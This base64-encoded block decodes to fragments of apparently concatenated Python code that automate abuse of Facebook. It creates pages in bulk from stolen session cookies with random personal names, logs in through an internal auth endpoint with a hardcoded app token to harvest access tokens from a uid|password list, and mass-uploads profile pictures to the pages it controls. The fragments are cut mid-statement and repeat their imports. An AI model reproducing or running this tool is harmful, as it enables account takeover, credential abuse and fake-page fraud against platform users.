ICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2F2Jzogc2VsZi5pZF9hY2MsCiAgICAgICAgICAgICdfX3VzZXInOiBzZWxmLmlkX2FjYywKICAgICAgICAgICAgJ3Byb2ZpbGVfaWQnOiBwYWdlX2lkLAogICAgICAgICAgICAnZmJfZHRzZyc6IHNlbGYuZmJfZHRzZywKICAgICAgICAgICAgJ3Bob3RvX3NvdXJjZSc6ICc0JywKICAgICAgICAgICAgJ2NvbXBvc2VyX2VudHJ5X3RpbWUnOiAnMCcsCiAgICAgICAgICAgICdjb21wb3Nlcl9zZXNzaW9uX2lkJzogJ2FiYycsCiAgICAgICAgICAgICdyZWYnOiAndGltZWxpbmUnLAogICAgICAgICAgICAndXBsb2FkX2lkJzogJ3Byb2ZpbGVfcGljJywKICAgICAgICAgICAgJ3VwbG9hZF90eXBlJzogJ3Byb2ZpbGUnLAogICAgICAgIH0KCiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5mYWNlYm9vay5jb20vcGhvdG9zL3VwbG9hZCcsIGhlYWRlcnM9aGVhZGVycywgZmlsZXM9ZmlsZXMsIGRhdGE9ZGF0YSkKCiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UuanNvbigpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICByZXR1cm4gcmVzcG9uc2UudGV4dAoKIyBGdW5jdGlvbiB0byBwcmludCBjb2xvcmVkIHRleHQKZGVmIGtvbG9yKHRleHQsIGNvbG9yKToKICAgIGlmIGNvbG9yID09ICdncmVlbic6CiAgICAgICAgcHJpbnQoRm9yZS5HUkVFTiArIHRleHQgKyBTdHlsZS5SRVNFVF9BTEwpCiAgICBlbGlmIGNvbG9yID09ICdyZWQnOgogICAgICAgIHByaW50KEZvcmUuUkVEICsgdGV4dCArIFN0eWxlLlJFU0VUX0FMTCkKICAgIGVsc2U6CiAgICAgICAgcHJpbnQodGV4dCkKCmRlZiBnZXRfY29va2llc19maWxlX3BhdGgoKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICByZXR1cm4gaW5wdXQoIkVudGVyIHRoZSBwYXRoIHRvIHRoZSBjb29raWVzLnR4dCBmaWxlOiAiKQoKZGVmIGhhY2tlenIoKToKICAgIAogICAgY29va2llc19maWxlID0gZ2V0X2Nvb2tpZXNfZmlsZV9wYXRoKCkKCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGNvb2tpZXNfZmlsZSwgJ3InKSBhcyBmOgogICAgICAgICAgICBjb29raWVzX2xpc3QgPSBmLnJlYWRsaW5lcygpCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3I6CiAgICAgICAga29sb3IoIkVycm9yOiBGaWxlIG5vdCBmb3VuZC4gUGxlYXNlIGNoZWNrIHRoZSBwYXRoLiIsICdyZWQnKQogICAgICAgIHJldHVybgoKICAgIGZvciBjb29raWVfbGluZSBpbiBjb29raWVzX2xpc3Q6CiAgICAgICAgY29va2llX2xpbmUgPSBjb29raWVfbGluZS5zdHJpcCgpICAjIFJlbW92ZSBsZWFkaW5nL3RyYWlsaW5nIHdoaXRlc3BhY2UKCiAgICAgICAgIyBGb3IgeW91ciBwcm92aWRlZCBmb3JtYXQsIG5vIG5lZWQgdG8gc3BsaXQgZnVydGhlcjsganVzdCB1c2UgdGhlIGVudGlyZSBsaW5lIGFzIGNvb2tpZXMKICAgICAgICBjb29raWVzID0gY29va2llX2xpbmUKCiAgICAgICAgdmlldG5hbWVzZV9uYW1lcyA9IFsKICAgICAgICAgICAiTXJzVGV4YXNVTklWRVJTRSBEci5NZWVuYWtzaGlSYXZpIiwKIk1lbGFuaWkiLAoiSXNyYXQgSmFoYW4iLAoiTWQgUnViZWwgS2FoYW4iLAoiTWFyaXlhIEFrdGhyIFNhdGhpIiwKIklzcmF0IFhhaGFuIEVzaGEiLAoiWW91bmlldGhhIFdhc2lsYWgiLAoiTnVzYWliYSBJc2xhbSBFdmEiLAoiTHggWm95YSIsCiJUYXNuaWEgUmFobWFuIiwKIk1laGVkaSBIYXNhbiIsCiJSb2phIElzbGFtIiwKIkVzbWUgSm9obnN0b24iLAoiUml5YSBKYWhhbiIsCiJTaW50aGl5YSBDaG93ZGh1cnkiLAoiSmFubmF0dWwgRmVyZG9zIiwKIkF5c2hhIEphbm5hdCIsCiJNb2ludWwgSXNsYW0gU2hhbnRvIiwKIlRhbnZlZXIgUmFobWFuIiwKIlJvc2FiZWwgTWVyY2FkbyBPYWluZyIsCiJCbmVnYWxpIEJhc2kiLAoiQXNobGllIEFsbGFpc2EiLAoiUmFwayBNaWFoIiwKIlNhaW1hIEFrdGVyIiwKIk1kIE1pbmFyIiwKIlRhaG1pbmEgSmFubmF0IE1pbSIsCiJIdW1hcnlyYSBCaW4gQWxsYmloaSIsCiJTYWRpeWEgQWt0ZXIiLAoiTUQgTmFlZW0iLAoiRm95c29sIEtoYW4iLAoiTWQgUm9iaXVsIFNoZWlraCIsCiJNZCBTb2hlbCIsCiJBbGV4IEhlbHMgQWZyaWR5IiwKIk9jZW5hIE1hbnVzIiwKIlNob2hhZyBTaGVpa2giLAoiR29qbyBTYXR1cm8iLAoiU2hhZGRhdCBLaGFuIiwKIk1EIE1pdGh1biIsCiJSYWtpYiBBaG1tZWQgRm95c2FsIiwKIk1kIE9saXVsbCBTaGVpa2giLAoiTWQgU2FiYmlyIFNoYWlrZSIsCiJTayBUdXNoYXIiLAoiVmFnbmUgRGV2IiwKIk1CIO+/vW3vv71tIiwKIkxpbW9uIFNlaGsgTGltb24gU2VoayIsCiJNZCBNaWxhbiIsCiJSZXlhZCBJc2xhbSIsCiJNZCBTaG9idXpwcmEiLAoiTWQgTWFzdW0gSXNsYW0iLAoiVGFuemltIFJhYmJ5IiwKIlLvv71iaW4gSGVyZSIsCiJNRCBTdW1vbiBNRCBTdW1vbiIsCiJBc2lmIEtoYW4iLAoiTWlzIEFmaWEiLAoi77+977+977+9be+/vWwgSO+/vXHvv73vv70iLAoiTWQgU2hha2liIE1yaWRoYSIsCiJVcnp6YWwgTWlhIiwKIlNhbXVlbCBSYW1pcmV6IiwKIlNoYWRkYXQgS2hhbiIsCiJTaGFoZWVuIEthbmFpcHVyIiwKIk1EIFNhbG1hbiBTYWsiLAoiTUQgQW1pcm9sIiwKIk1haGVkaSBJc2xhbSIsCiJNRCBBbGhhc3NhbiBIYXdsZGVyIiwKIkFuaXMgT3NpbSIsCiJSYWloYW4gSXNsYW0iLAoiSGFtaWRhIEZvcmlkIFB1ciIsCiJNRCBTb2hlbCBTaGVpa2giLAoiTWQgRW1yYW0iLAoiTWQgTmlqYW0gVWRkaW4gU2hlaWtoIiwKIk1EIEJpcGxvYiIsCiJNZCBNb3lhenplbSIsCiJNZCBBemFkIiwKIkJBIERIIE9OIiwKIk1kIFJlemF1bCBSZXphdWwiLAoiVGFuamluIE1vbGxhIiwKIk1kIFN1bW9uIiwKIk9iYWlkdWwgS3JpbSIsCiJSYWJieSBLaGFuIiwKIkphaGFuZ2lyIEdhemkiLAoiTWQuIFRhbWltIiwKIk5hamlyIFNoZWlraCIsCiJBYnUgQmFrYXIgS2hhbiIsCiJNZCBBbGFtaW4iLAoiU2d1c2ggUnN1aGUiLAoiUmFiYnkgU2hlaWtoIiwKICAgICAgICBdCgogICAgICAgIHJhbmRvbV9uYW1lID0gcmFuZG9tLmNob2ljZSh2aWV0bmFtZXNlX25hbWVzKQoKICAgICAgICByZWdfaW5zdGFuY2UgPSBSZWdQcm81KGNvb2tpZXMpCiAgICAgICAgcmVzdWx0ID0gcmVnX2luc3RhbmNlLnJlZyhyYW5kb21fbmFtZSkKCiAgICAgICAgaWYgJ2Vycm9yJyBub3QgaW4gcmVzdWx0OgogICAgICAgICAgICBwcmludChmIiAgICB7Ymx1ZX3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBcMDMzWzBtIikKICAgICAgICAgICAga29sb3IoZiIgICAgIHtncmVlbn1bU1VDQ0VTU10ge3JlZH1DcmVhdGVkIFBhZ2UiLCAnZ3JlZW4nKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICAgICBrb2xvcihmIiAgICAge3JlZH1bVU5TVUNDRVNTRlVMXSB7Z3JlZW59Q3JlYXRlZCBQYWdlIiwgJ3JlZCcpCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgb3MKCmNsYXNzIENvbG9yOgogICAgRU5EID0gJ1wwMzNbMG0nCiAgICBCT0xEID0gJ1wwMzNbMW0nCiAgICBSRUQgPSAnXDAzM1s5MW0nCiAgICBHUkVFTiA9ICdcMDMzWzkybScKICAgIFlFTExPVyA9ICdcMDMzWzkzbScKICAgIEJMVUUgPSAnXDAzM1s5NG0nCiAgICBDWUFOID0gJ1wwMzNbOTZtJwoKZGVmIHB6bCh1c2VybmFtZSwgcGFzc3dvcmRzKToKICAgICMgRGVmaW5lIHRoZSBuZXcgYWNjZXNzIHRva2VuIGFuZCBBUEkgZGV0YWlscwogICAgYWNjZXNzVG9rZW4gPSAnMzUwNjg1NTMxNzI4fDYyZjhjZTlmNzRiMTJmODRjMTIzY2MyMzQzN2E0YTMyJyAgIyBFeGFtcGxlIHRva2VuCiAgICB1cmwgPSAnaHR0cHM6Ly9iLWdyYXBoLmZhY2Vib29rLmNvbS9hdXRoL2xvZ2luP2luY2x1ZGVfaGVhZGVycz1mYWxzZSZkZWNvZGVfYm9keV9qc29uPWZhbHNlJnN0cmVhbWFibGVfanNvbl9yZXNwb25zZT10cnVlJwoKICAgIGZvciBwYXNzd29yZCBpbiBwYXNzd29yZHM6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ21ldGhvZCc6ICdhdXRoLmxvZ2luJywKICAgICAgICAgICAgJ2ZiX2FwaV9yZXFfZnJpZW5kbHlfbmFtZSc6ICdhdXRoZW50aWNhdGUnLAogICAgICAgICAgICAnZmJfYXBpX2NhbGxlcl9jbGFzcyc6ICdjb20uZmFjZWJvb2suYWNjb3VudC5sb2dpbi5wcm90b2NvbC5GYjRhQXV0aEhhbmRsZXInLAogICAgICAgICAgICAnYXBpX2tleSc6ICc2MmY4Y2U5Zjc0YjEyZjg0YzEyM2NjMjM0MzdhNGEzMicsCiAgICAgICAgICAgICdlbWFpbCc6IHVzZXJuYW1lLAogICAgICAgICAgICAncGFzc3dvcmQnOiBwYXNzd29yZCwKICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IGFjY2Vzc1Rva2VuCiAgICAgICAgfQogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgZGF0YT1kYXRhKQogICAgICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKICAgICAgICAgICAgcmVzcG9uc2VzID0gcmVzcG9uc2UuanNvbigpCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiAnYWNjZXNzX3Rva2VuJyBpbiByZXNwb25zZXM6CiAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2VzWydhY2Nlc3NfdG9rZW4nXSwgVHJ1ZQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgZXJyb3JfbXNnID0gcmVzcG9uc2VzLmdldCgnZXJyb3JfbXNnJywgJ1Vua25vd24gZXJyb3InKQogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Q29sb3IuUkVEfUVycm9yIGZvciB7dXNlcm5hbWV9OiB7ZXJyb3JfbXNnfXtDb2xvci5FTkR9IikKICAgICAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYie0NvbG9yLlJFRH1FcnJvciBmb3Ige3VzZXJuYW1lfToge3N0cihlKX17Q29sb3IuRU5EfSIpCiAgICAKICAgIHJldHVybiBOb25lLCBGYWxzZQoKZGVmIHNhdih0b2tlbnNfYXJyYXksIHRva2VuX2ZpbGVfcGF0aCk6CiAgICAiIiJTYXZlIHRva2VucyBpbiB1aWR8dG9rZW4gZm9ybWF0LiIiIgogICAgd2l0aCBvcGVuKHRva2VuX2ZpbGVfcGF0aCwgJ3cnKSBhcyBmaWxlOgogICAgICAgIGZvciB0b2tlbl9pbmZvIGluIHRva2Vuc19hcnJheToKICAgICAgICAgICAgdWlkID0gdG9rZW5faW5mb1snZW1haWwnXQogICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbl9pbmZvWydhY2Nlc3NfdG9rZW4nXQogICAgICAgICAgICBmaWxlLndyaXRlKGYie3VpZH18e2FjY2Vzc190b2tlbn1cbiIpCgpkZWYgcHJ6KGZpbGVfcGF0aCwgdG9rZW5zX2FycmF5KToKICAgICIiIlByb2Nlc3MgdGhlIGZpbGUgYW5kIGV4dHJhY3QgdG9rZW5zIGZvciB1aWR8cGFzcyBmb3JtYXQuIiIiCiAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZmlsZV9wYXRoKToKICAgICAgICBwcmludChmIntDb2xvci5CT0xEfUZpbGUge2ZpbGVfcGF0aH0gZG9lcyBub3QgZXhpc3Que0NvbG9yLkVORH0iKQogICAgICAgIHJldHVybgoKICAgIHByaW50KGYiICAgICB7Q29sb3IuQk9MRH1Qcm9jZXNzaW5nIGZpbGU6IHtmaWxlX3BhdGh9e0NvbG9yLkVORH0iKQoKICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyJykgYXMgZmlsZToKICAgICAgICBsaW5lcyA9IGZpbGUucmVhZGxpbmVzKCkKCiAgICBpZiBub3QgbGluZXM6CiAgICAgICAgcHJpbnQoZiJ7Q29sb3IuQk9MRH1GaWxlIHtmaWxlX3BhdGh9IGlzIGVtcHR5LntDb2xvci5FTkR9IikKICAgICAgICByZXR1cm4KCiAgICBhY2NvdW50X3BhaXJzID0gW2xpbmUuc3RyaXAoKSBmb3IgbGluZSBpbiBsaW5lcyBpZiAnfCcgaW4gbGluZV0KCiAgICBpZiBub3QgYWNjb3VudF9wYWlyczoKICAgICAgICBwcmludChmIntDb2xvci5CT0xEfU5vIHZhbGlkIHVpZHxwYXNzIHBhaXJzIGZvdW5kIGluIHtmaWxlX3BhdGh9LntDb2xvci5FTkR9IikKICAgICAgICByZXR1cm4KCiAgICBmb3IgYWNjb3VudCBpbiBhY2NvdW50X3BhaXJzOgogICAgICAgIHVpZCwgcGFzc3dvcmQgPSBhY2NvdW50LnNwbGl0KCd8JykKICAgICAgICBwYXNzCiAgICAgICAgdG9rZW4sIHN1Y2Nlc3MgPSBwemwodWlkLCBbcGFzc3dvcmRdKSAgIyBVc2luZyB0aGUgcGFzc3dvcmQgYXMgYSBzaW5nbGUgZWxlbWVudCBsaXN0CiAgICAgICAgaWYgc3VjY2VzczoKICAgICAgICAgICAgdG9rZW5zX2FycmF5LmFwcGVuZCh7ImVtYWlsIjogdWlkLCAiYWNjZXNzX3Rva2VuIjogdG9rZW59KQogICAgICAgICAgICBwcmludChmIntDb2xvci5HUkVFTn1TdWNjZXNzZnVsbHkgZXh0cmFjdGVkIHRva2VuIGZvciB7dWlkfXtDb2xvci5FTkR9IikKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludChmIntDb2xvci5CT0xEfUZhaWxlZCB0byBnZXQgdG9rZW4gZm9yIHt1aWR9LntDb2xvci5FTkR9IikKCmRlZiBtYXooKToKICAgIGNsZWFyX3NjcmVlbigpCiAgICBqb3ZhbigpCiAgICBmaWxlX3BhdGggPSBpbnB1dChmIntDb2xvci5ZRUxMT1d9RW50ZXIgdGhlIHBhdGggb2YgdGhlIHRleHQgZmlsZSB3aXRoIGFjY291bnRzIGFuZCBwYXNzd29yZHM6IHtDb2xvci5FTkR9Iikuc3RyaXAoKQogICAgdG9rZW5fZmlsZV9wYXRoID0gaW5wdXQoZiJ7Q29sb3IuWUVMTE9XfUVudGVyIHRoZSBwYXRoIG9mIHRoZSBmaWxlIHdoZXJlIHRva2VucyBzaG91bGQgYmUgc3RvcmVkOiB7Q29sb3IuRU5EfSIpLnN0cmlwKCkKICAgIAogICAgdG9rZW5zX2FycmF5ID0gW10KICAgIHByeihmaWxlX3BhdGgsIHRva2Vuc19hcnJheSkKCiAgICBpZiB0b2tlbnNfYXJyYXk6CiAgICAgICAgcGFzcwogICAgICAgIGZvciB0b2tlbl9pbmZvIGluIHRva2Vuc19hcnJheToKICAgICAgICAgICAgcGFzcwogICAgICAgIAogICAgICAgIHNhdih0b2tlbnNfYXJyYXksIHRva2VuX2ZpbGVfcGF0aCkgICMgU2F2ZSB0b2tlbnMgaW4gdWlkfHRva2VuIGZvcm1hdAogICAgZWxzZToKICAgICAgICBwcmludChmIntDb2xvci5CT0xEfU5vIHRva2VucyBjb2xsZWN0ZWQue0NvbG9yLkVORH0iKQoKICAgIHByaW50KGYie0NvbG9yLkJMVUV9RXhpdGluZyB0aGUgcHJvZ3JhbS4uLntDb2xvci5FTkR9IikKCiMgUnVuIHRoZSBwcm9ncmFtCgoKCgoKCiMgU3RhcnQgdGhlIHByb2dyYW0KCgoKZGVmIHN0YXJ0KCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgdG9rZW5fZmlsZV9wYXRoID0gaW5wdXQoIkVudGVyIHRoZSBwYXRoIHRvIHRoZSBmaWxlIGNvbnRhaW5pbmcgdGhlIHRva2VuczogIikuc3RyaXAoKQogICAgCiAgICB0b2tlbnMgPSByYWQodG9rZW5fZmlsZV9wYXRoKQogICAgaWYgbm90IHRva2VuczoKICAgICAgICBwcmludCgiTm8gdG9rZW5zIGZvdW5kLiBFeGl0aW5nLiIpCiAgICAgICAgcmV0dXJuCgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKERJUkVDVE9SWSk6CiAgICAgICAgcHJpbnQoZiJFcnJvcjogRGlyZWN0b3J5ICd7RElSRUNUT1JZfScgZG9lcyBub3QgZXhpc3QuIikKICAgICAgICByZXR1cm4KCiAgICBmaWxlc19pbl9kaXJlY3RvcnkgPSBvcy5saXN0ZGlyKERJUkVDVE9SWSkKICAgIGlmIG5vdCBmaWxlc19pbl9kaXJlY3Rvcnk6CiAgICAgICAgcHJpbnQoZiJFcnJvcjogTm8gZmlsZXMgZm91bmQgaW4gZGlyZWN0b3J5ICd7RElSRUNUT1JZfScuIikKICAgICAgICByZXR1cm4KCiAgICBmb3IgdXNlcl90b2tlbiBpbiB0b2tlbnM6CiAgICAgICAgcGFnZXMgPSBwaWd6cyh1c2VyX3Rva2VuKQogICAgICAgIGlmIG5vdCBwYWdlczoKICAgICAgICAgICAgcHJpbnQoZiJObyBwYWdlcyBmb3VuZCBmb3IgdG9rZW4ge3VzZXJfdG9rZW59LiBTa2lwcGluZy4iKQogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgcGFnZSBpbiBwYWdlczoKICAgICAgICAgICAgcGFzcwogICAgICAgICAgICBwYWdlX2lkID0gcGFnZVsnaWQnXQogICAgICAgICAgICBwYWdlX2FjY2Vzc190b2tlbiA9IHBhZ2UuZ2V0KCdhY2Nlc3NfdG9rZW4nKQoKICAgICAgICAgICAgaWYgbm90IHBhZ2VfYWNjZXNzX3Rva2VuOgogICAgICAgICAgICAgICAgcHJpbnQoZiJObyBhY2Nlc3MgdG9rZW4gZm91bmQgZm9yIHBhZ2Uge3BhZ2VfaWR9LiBTa2lwcGluZy4iKQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICMgQ2hlY2sgaWYgdGhlIHBhZ2UgYWxyZWFkeSBoYXMgYSBwcm9maWxlIHBpY3R1cmUKICAgICAgICAgICAgaWYgcGVjKHBhZ2VfaWQpOgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICMgUmFuZG9tbHkgc2VsZWN0IGEgZmlsZSBmcm9tIHRoZSBkaXJlY3RvcnkKICAgICAgICAgICAgZmlsZV9uYW1lID0gcmFuZG9tLmNob2ljZShmaWxlc19pbl9kaXJlY3RvcnkpCiAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihESVJFQ1RPUlksIGZpbGVfbmFtZSkKCiAgICAgICAgICAgIHJlc3VsdCA9IHBsb2QocGFnZV9pZCwgcGFnZV9hY2Nlc3NfdG9rZW4sIGZpbGVfcGF0aCkKICAgICAgICAgICAgcHJpbnQoZiIgICAge2JsdWV94pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzM1swbSIpCiAgICAgICAgICAgIHByaW50KGYiICAgIHtncmVlbn1TVUNDRVNTRlVMTFkgVVBMT0FERUQgUFJPRklMRSBQSUNUVVJFIHtwYWdlWyduYW1lJ119IOKUgOKUgOKUgOKUgOKUgOKUgD4ge3BhZ2VbJ2lkJ119ICIpCiAgICAgICAgICAgIHByaW50KGYiICAgIHtibHVlfeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFwwMzNbMG0iKQogICAgICAgICAgICAjIEFkZCBhIGRlbGF5IGJldHdlZW4gcmVxdWVzdHMgdG8gYXZvaWQgaGl0dGluZyByYXRlIGxpbWl0cwogICAgICAgICAgICB0aW1lLnNsZWVwKDIpICAjIEFkanVzdCBkZWxheSBhcyBuZWVkZWQKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBvcwppbXBvcnQgcmFuZG9tCmltcG9ydCB0aW1lCgpCQVNFX1VSTCA9ICdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTguMCcKRElSRUNUT1JZID0gJ1BpY3R1cmUnCgpkZWYgcGlnenMoYWNjZXNzX3Rva2VuKToKICAgIHVybCA9IGYne0JBU0VfVVJMfS9tZS9hY2NvdW50cycKICAgIHBhcmFtcyA9IHsKICAgICAgICAnYWNjZXNzX3Rva2VuJzogYWNjZXNzX3Rva2VuCiAgICB9CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsLCBwYXJhbXM9cGFyYW1zKQogICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCkuZ2V0KCdkYXRhJywgW10pCiAgICBleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5SZXF1ZXN0RXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvciBnZXR0aW5nIHBhZ2VzIGZvciB0b2tlbiB7YWNjZXNzX3Rva2VufToge3N0cihlKX0iKQogICAgICAgIHJldHVybiBbXQoKZGVmIHBlYyhwYWdlX2lkKToKICAgIHVybCA9IGYne0JBU0VfVVJMfS97cGFnZV9pZH0/ZmllbGRzPXBpY3R1cmUnCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQogICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQogICAgICAgIHBpY3R1cmVfZGF0YSA9IHJlc3BvbnNlLmpzb24oKS5nZXQoJ3BpY3R1cmUnLCB7fSkKICAgICAgICByZXR1cm4gJ2RhdGEnIGluIHBpY3R1cmVfZGF0YSBhbmQgJ3VybCcgaW4gcGljdHVyZV9kYXRhWydkYXRhJ10KICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkVycm9yIGNoZWNraW5nIHByb2ZpbGUgcGljdHVyZSBmb3IgcGFnZSB7cGFnZV9pZH06IHtzdHIoZSl9IikKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBwbG9kKHBhZ2VfaWQsIHBhZ2VfYWNjZXNzX3Rva2VuLCBmaWxlX3BhdGgpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGVzID0gewogICAgICAgICAgICAgICAgJ3NvdXJjZSc6IGZpbGUKICAgICAgICAgICAgfQogICAgICAgICAgICBkYXRhID0gewogICAgICAgICAgICAgICAgJ2FjY2Vzc190b2tlbic6IHBhZ2VfYWNjZXNzX3Rva2VuCiAgICAgICAgICAgIH0KICAgICAgICAgICAgdXJsID0gZid7QkFTRV9VUkx9L3twYWdlX2lkfS9waWN0dXJlJwogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBmaWxlcz1maWxlcywgZGF0YT1kYXRhKQogICAgICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKQogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiRXJyb3IgdXBsb2FkaW5nIHByb2ZpbGUgcGljdHVyZSB0byBwYWdlIHtwYWdlX2lkfToge3N0cihlKX0iKQogICAgICAgIHJldHVybiB7J2Vycm9yJzogc3RyKGUpfQogICAgZXhjZXB0IEZpbGVOb3RGb3VuZEVycm9yIGFzIGU6CiAgICAgICAgcHJpbnQoZiJFcnJvcjogRmlsZSBub3QgZm91bmQge2ZpbGVfcGF0aH06IHtzdHIoZSl9IikKICAgICAgICByZXR1cm4geydlcnJvcic6IHN0cihlKX0KCmRlZiByYWQoZmlsZV9wYXRoKToKICAgIHRva2VucyA9IFtdCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGZpbGVfcGF0aCwgJ3InKSBhcyBmaWxlOgogICAgICAgICAgICBsaW5lcyA9IGZpbGUucmVhZGxpbmVzKCkKICAgICAgICAgICAgZm9yIGxpbmUgaW4gbGluZXM6CiAgICAgICAgICAgICAgICAjIFN0cmlwIGFueSB3aGl0ZXNwYWNlIGFuZCBjaGVjayBpZiB0aGUgbGluZSBjb250YWlucyB0aGUgZXhwZWN0ZWQgZm9ybWF0CiAgICAgICAgICAgICAgICBsaW5lID0gbGluZS5zdHJpcCgpCiAgICAgICAgICAgICAgICBpZiAnfCcgaW4gbGluZToKICAgICAgICAgICAgICAgICAgICB1aWQsIHRva2VuID0gbGluZS5zcGxpdCgnfCcsIDEpICAjIFNwbGl0IG9uIHRoZSBmaXJzdCAnfCcKICAgICAgICAgICAgICAgICAgICB0b2tlbnMuYXBwZW5kKCh1aWQuc3RyaXAoKSwgdG9rZW4uc3RyaXAoKSkpICAjIEFwcGVuZCBhcyBhIHR1cGxlCiAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3IgYXMgZToKICAgICAgICBwcmludChmIkVycm9yOiBUb2tlbnMgZmlsZSBub3QgZm91bmQge2ZpbGVfcGF0aH06IHtzdHIoZSl9IikKICAgIHJldHVybiB0b2tlbnMKCmRlZiBtYWluenNhKCk6CiAgICBjbGVhcl9zY3JlZW4oKQogICAgam92YW4oKQogICAgcHJpbnQoZiIgICAgIHtyZWR9WzFdIHtncmVlbn1HRVQgVE9LRU4iKQogICAgcHJpbnQoKQogICAgcHJpbnQoZiIgICAgIHtyZWR9WzJdIHtncmVlbn1TRVQgUEZQIikKICAgIHByaW50KCJcMDMzWzE7MzFt4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSAXDAzMyIpCiAgICBjaG9pY2UgPSBpbnB1dCgiRW50ZXI6ICIpCiAgICBpZiBjaG9pY2U